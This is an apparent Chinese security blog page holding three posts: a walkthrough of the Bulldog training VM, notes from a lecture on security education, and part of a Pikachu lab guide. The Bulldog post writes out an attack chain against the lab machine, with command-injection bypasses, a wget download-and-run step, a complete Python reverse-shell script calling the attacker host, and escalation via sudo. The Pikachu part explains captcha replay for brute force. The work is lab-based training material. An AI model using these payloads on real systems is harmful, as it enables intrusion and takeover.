<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Try &amp; Enjoy">
<meta property="og:type" content="website">
<meta property="og:title" content="SwanQ&#39;s Blue SKY">
<meta property="og:url" content="http://swanq.top/page/2/index.html">
<meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
<meta property="og:description" content="Try &amp; Enjoy">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="swanQ">
<meta property="article:tag" content="penetration, forensics, web, cyber security">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://swanq.top/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>SwanQ's Blue SKY</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SwanQ's Blue SKY</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">TO LIVE IS TO RISK IT ALL</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">52</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">24</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/05/bulldog/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/05/bulldog/" class="post-title-link" itemprop="url">渗透测试之bulldog</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-05 20:44:04" itemprop="dateCreated datePublished" datetime="2021-05-05T20:44:04+08:00">2021-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-06 17:07:00" itemprop="dateModified" datetime="2021-05-06T17:07:00+08:00">2021-05-06</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日突然冒出渗透靶机的想法，突然一看，前人早已栽好了树。</p>
<p>每日分享：原来在孩提时期就已经看过余华的活着，只是当时读懂活着的人不是我。</p>
<p>小狗拼命的想叫醒他的同伴，可他还不知道同伴可能再也醒不过来了</p>
<p>每天都有人跟你一样在注视着生活中的点滴</p>
<p>最后献上红楼的一句箴言：假亦真时真亦假，无为有处有还无</p>
<p>不知道既喜欢红楼又喜欢昆曲，把后半辈子都献给教授外国人红楼梦的他，心境又是如何呢</p>
<p>人生本来就是尝试的过程，正确与否在你以为</p>
<p>也罢，继续写博客辽</p>
<h1 id="0x01-资产收集"><a href="#0x01-资产收集" class="headerlink" title="0x01 资产收集"></a>0x01 资产收集</h1><p>靶机：Ubuntu16.04：192.168.127.134</p>
<p>攻击机：kali 2021.1：192.168.127.133</p>
<p>愣是想不起来这个命令叫啥：lsb_release -a</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主机发现</span></span><br><span class="line"><span class="comment"># ping scan</span></span><br><span class="line">nmap -sn 192.168.127.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">masscan --rate=10000 --ports 0-65535 192.168.127.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 探究端口服务</span></span><br><span class="line">nmap -sV -T4 -O -p 23,80,8080 192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/1.png"></p>
<p>可以看到python版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描子域名</span></span><br><span class="line">dirb http://192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/2.png"></p>
<p>去康康admin和dev分别是什么服务。访问admin会看到无验证码的登陆界面，而dev必须登陆之后才可以看到。</p>
<p>dev页面有多个邮箱，去康康dev的源码，可能会md5加密的密码存储，一看还真有。解密之后尝试登陆admin页面，发现后两个账号可以登陆进去。不过账号是邮箱的前面，也就是姓名，登陆进去之后，发现dev界面的web shell也有了权限。其实这个界面类似于拿到一台被限制命令白名单的机子。尝试绕过吧。</p>
<p><img src="/2021/05/05/bulldog/4.png"></p>
<h1 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h1><p><strong>远程命令执行漏洞检测</strong>：</p>
<p>使用;同时执行多个命令，被过滤；</p>
<p>使用**&amp;,&amp;&amp;,|**同时执行多个命令,成功。</p>
<p>查看敏感目录，发现3个用户：<br><img src="/2021/05/05/bulldog/3.png"></p>
<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>试试反弹shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在kali的/var/html/www目录下，搭建web服务</span></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击机监听1234端口</span></span><br><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行wget命令尝试连接</span></span><br><span class="line">pwd &amp; wget http://192.168.127.133</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机下载shell文件</span></span><br><span class="line">ls &amp; wget http://192.168.56.133/shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行shell</span></span><br><span class="line">ls &amp; python shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机删除shell</span></span><br><span class="line">ls &amp; rm -rf shell.py</span><br></pre></td></tr></table></figure>

<p>其中反弹shell脚本shell.py内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># create an INET, STREAMing socket</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># now connect to the web server on port 1234</span></span><br><span class="line">s.connect((<span class="string">&quot;192.168.127.133&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">os.dup(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>



<p><img src="/2021/05/05/bulldog/5.png"></p>
<p>进入home，查看其他用户:bulldogadmin  django</p>
<p>进入bulldogadmin，查看所有文件，此时还是ls -la找到隐藏目录.hiddenadmindirectory。找到可执行文件customPermissionApp。<strong>strings</strong>查看其中字符</p>
<p><img src="/2021/05/05/bulldog/6.png"></p>
<p>猜测密码SUPERultimatePASSWORDyouCANTget。不过此处H到底代表什么暂时还不清楚。</p>
<h1 id="0x04-提权-后门维持"><a href="#0x04-提权-后门维持" class="headerlink" title="0x04  提权/后门维持"></a>0x04  提权/后门维持</h1><p>此时无法提权，需要打开新终端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开新终端</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>

<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><ol>
<li><p>习惯查看网页源码以及查看bash下所有文件<strong>ls -la</strong></p>
</li>
<li><p>&amp;&amp;   &amp;    |的妙用</p>
</li>
<li><p>当cat查看某些文件出现乱码时，可以考虑用strings</p>
</li>
<li><p>一般反弹的shell不如终端，一般拿到后都先用python弹一个终端出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&quot;</span>/bin/bash<span class="string">&quot;)&quot;</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure></li>
<li><p>反弹shell过程</p>
</li>
<li><p>知识点总结：</p>
<ul>
<li><p>Python -m ：mod,run library module  as  a   script</p>
</li>
<li><p>SimpleHTTPServe：use Python SimpleHTTPServer to turn any directory into a simple HTTP web server.</p>
</li>
<li><p>python http服务器运行在80端口</p>
</li>
<li><p>nmap -sn：ping scan</p>
</li>
<li><p>masscan –rate=10000 –ports 0-65535 192.168.127.134：</p>
<p>–rate=10000  意思是10kpps(packet per second)，每秒一万个数据包</p>
</li>
<li><p>wget：非交互式网络文件下载工具</p>
</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/" class="post-title-link" itemprop="url">方滨兴院士讲座有感</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-29 09:54:26" itemprop="dateCreated datePublished" datetime="2021-04-29T09:54:26+08:00">2021-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-03 21:38:39" itemprop="dateModified" datetime="2021-05-03T21:38:39+08:00">2021-05-03</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="什么是六论视觉"><a href="#什么是六论视觉" class="headerlink" title="什么是六论视觉"></a>什么是六论视觉</h1><p>六论视觉：强弱是相对论,知识是认识论(敢闯无人区),失败是实践论,决策是矛盾论(多目标,化解矛盾才是最重要的),发展是进化论,管理是方法论(球不能停在自己脚下)</p>
<p>网络安全人才的培养的六论视觉：能力是相对论,安全是认识论,攻防是实践论,选择是矛盾论,水平是进化论,鉴别是进化论.</p>
<ol>
<li>安全是认识论：<br>超过5000就构成犯罪。所以会用到靶场(类比少林弟子)。</li>
</ol>
<h1 id="人才培养"><a href="#人才培养" class="headerlink" title="人才培养"></a>人才培养</h1><p><strong>技能：知识(西电)+方法(方班)</strong></p>
<ul>
<li><p>知识：事实 常识 规则</p>
</li>
<li><p>方法：思辨 质疑 创新</p>
<p>迅速适应企业的要求，迅速补上知识。自信的提升就是方法的提升。我觉得这么干是对的就是对的。美国一直行走在无人区。也要抬头看看是否真的无人，不怕走无人区，睁大眼睛可能有人做得比我好。</p>
<p>思辨：如小萁所言，把查到得信息变为知识为思辨的过程。需要训练。思辨才是看难文章的敲门砖。你最会什么?你最懂的知道什么？把一件事思辨的搞明白。会思辨之后，再看顶会(挑战难度)。听完之后，迅速提炼自己的问题。保证心里有预期答案。为什么没按。不应该有答案，也是提高。特别坚信他是错的。每次讲完做总结。</p>
</li>
</ul>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>靶场：vulhub  pikachu  raven  sqli-lab</p>
<p>内打内属于靶场(CTF)；内打外属于护网；外打外属于系统测试(方班演武堂)；外打内设备测试(大量人众测)。</p>
<p>军队搞CTF赛很奇葩，每年参加CTF没什么意义(相当于奥赛其实，对于初学者)，为了比赛而比赛不可取，应该参与真正的实战。</p>
<p>没有xss等。看的是逻辑漏洞，整个认证是在前端，认证应该在后端。改了应用程序，只看底层造成的。</p>
<p>不要培养专职的CTF选手。仅限在学校</p>
<h1 id="自我提高"><a href="#自我提高" class="headerlink" title="自我提高"></a>自我提高</h1><p><strong>最牛的要真的牛</strong></p>
<h2 id="状态："><a href="#状态：" class="headerlink" title="状态："></a>状态：</h2><p>有一个做的特别深,便会知道怎么做.</p>
<p>每天激情状态</p>
<p>需要空闲期去考虑自己下一步要做什么，单目标函数还是双目标函数。</p>
<p>喜欢理论支持博士，喜欢实践鼓励创业</p>
<p>先去公司就业，积累资源、人脉，然后去创业。</p>
<h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h2><p>靶场–&gt;对应的CTF赛题–&gt;实战、SRC。哪块弱补哪块。</p>
<h2 id="安排："><a href="#安排：" class="headerlink" title="安排："></a>安排：</h2><ol>
<li><strong>对于自己：各种靶场训练，然后实操。</strong></li>
<li><strong>redis–&gt;渗透测试 搞清楚，一步一步来</strong></li>
<li>去拿到各种SRC的证书。</li>
<li>知识积累，突变（量变转质变）web后期一定会是二进制.–横向贯彻(各个方向都要)</li>
<li>未接触领域,善于找标签:岗位体系–&gt;需要什么知识体系–&gt;将自己的标签和他对应上。标签需要很详细到某方面,类似于安全设备配置这样,而不是安全配置.</li>
<li>每天一篇：电子取证领域的论文</li>
</ol>
<h3 id="为何高分低能？"><a href="#为何高分低能？" class="headerlink" title="为何高分低能？"></a>为何高分低能？</h3><p>考试是采样,高分低能就是这样.采样是点,然而交流或者应用是连续.采样题是无聊的,宽泛的,面试其实也是,都是连续交流,其实开卷反而更难.</p>
<p>参考：</p>
<p>认证业务平台:<a target="_blank" rel="noopener" href="http://cstc.cncstea.cn/">http://cstc.cncstea.cn</a></p>
<p><a target="_blank" rel="noopener" href="http://examanage.cncstea.cn/">http://examanage.cncstea.cn</a></p>
<p>​    </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/28/pikachu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/28/pikachu/" class="post-title-link" itemprop="url">pikachu靶场通关指南(一)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-28 16:05:10" itemprop="dateCreated datePublished" datetime="2021-04-28T16:05:10+08:00">2021-04-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-04 11:34:00" itemprop="dateModified" datetime="2021-05-04T11:34:00+08:00">2021-05-04</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近需要找实习了，来Pikachu靶场再复习一下重要类型的漏洞，具体搭建指南网上应有尽有，此处不再赘述。</p>
<h1 id="Burt-Force"><a href="#Burt-Force" class="headerlink" title="Burt Force"></a>Burt Force</h1><h3 id="相关："><a href="#相关：" class="headerlink" title="相关："></a>相关：</h3><p>安全认证策略:<br>用户密码设置是否足够复杂</p>
<p>每次认证是否使用安全验证码</p>
<p>对尝试登陆的行为是否进行判断和限制(连续5次错误登陆锁定账号等)</p>
<p>是否采用双因素认证</p>
<h3 id="经验："><a href="#经验：" class="headerlink" title="经验："></a>经验：</h3><h4 id="暴力破解流程"><a href="#暴力破解流程" class="headerlink" title="暴力破解流程"></a>暴力破解流程</h4><ul>
<li>找到登录接口的脆弱性<ul>
<li>尝试登录—抓包—观察验证元素和response，判断是否可以暴力破解</li>
</ul>
</li>
<li>优化字典</li>
<li>自动化工具</li>
</ul>
<h4 id="生成高效字典"><a href="#生成高效字典" class="headerlink" title="生成高效字典"></a>生成高效字典</h4><ul>
<li>比如常用的用户名/密码TOP500</li>
<li>脱裤后的账号密码（社工库）</li>
<li>根据特定的对象（比如手机、生日和银行卡号等）按照指定的规则来生成密码</li>
</ul>
<h4 id="字典优化技巧"><a href="#字典优化技巧" class="headerlink" title="字典优化技巧"></a>字典优化技巧</h4><ul>
<li>根据注册提示进行优化，如注册要求密码8位以上，就去掉少于8位的密码</li>
<li>爆破管理后台时，账号是 admin / administrator / root 的可能性较高</li>
</ul>
<h2 id="验证码绕过-on-server-服务器"><a href="#验证码绕过-on-server-服务器" class="headerlink" title="验证码绕过(on server)服务器"></a>验证码绕过(on server)服务器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;密码不能为空&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码不能为空哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//              验证验证码是否正确</span></span><br><span class="line">                <span class="keyword">if</span> (strtolower(<span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>]) != strtolower(<span class="variable">$_SESSION</span>[<span class="string">&#x27;vcode&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$html</span> .= <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;验证码输入错误哦！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="comment">//应该在验证完成后,销毁该$_SESSION[&#x27;vcode&#x27;]</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                    <span class="variable">$vcode</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;vcode&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=? and password=md5(?)&quot;</span>;</span><br><span class="line">                    <span class="variable">$line_pre</span> = <span class="variable">$link</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$line_pre</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;execute())&#123;</span><br><span class="line">                        <span class="variable">$line_pre</span>-&gt;store_result();</span><br><span class="line">                        <span class="comment">//虽然前面做了为空判断,但最后,却没有验证验证码!!!</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;num_rows()==<span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="variable">$html</span>.=<span class="string">&#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt;执行错误:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;errno.<span class="string">&#x27;错误信息:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;error.<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中比较完验证码后，并没有销毁该验证码。所以猜测验证码一直有效，可以不停重放数据包。</p>
<p>所以可以通过验证码重放，来绕过验证码爆破用户民共和密码。</p>
<p><img src="/2021/04/28/pikachu/1.png"></p>
<p><img src="/2021/04/28/pikachu/2.jpg"></p>
<p><img src="/2021/04/28/pikachu/3.png"></p>
<p>成功爆破出目前pikachu的用户及密码</p>
<h2 id="验证码绕过-on-client-服务器"><a href="#验证码绕过-on-client-服务器" class="headerlink" title="验证码绕过(on client)服务器"></a>验证码绕过(on client)服务器</h2><p>可以看到用js生成随机字符作为验证码候选，然后创建验证码并进行验证。所以在本案例下，可利用知道用户名或密码的前提下，可以对另一个参数进行暴力枚举。</p>
